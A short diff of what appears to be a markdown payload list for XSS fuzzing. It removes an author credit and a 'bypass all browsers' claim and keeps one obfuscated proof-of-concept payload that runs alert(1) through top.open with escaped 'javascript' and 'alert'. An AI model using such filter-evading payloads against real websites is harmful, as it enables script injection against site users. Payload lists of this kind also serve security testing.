@@ -1,5 +1,4 @@
-# Payload For Xss Fuzzing - Collector@flagellantX
-# Bypass All Browser Like Chrome,Firefox,Yandex,all...
+# Payload For Xss Fuzzing
 ```
 PoC obfuscation alternative for alert(1): 
 top.open`javas\cript:al\ert(1)`
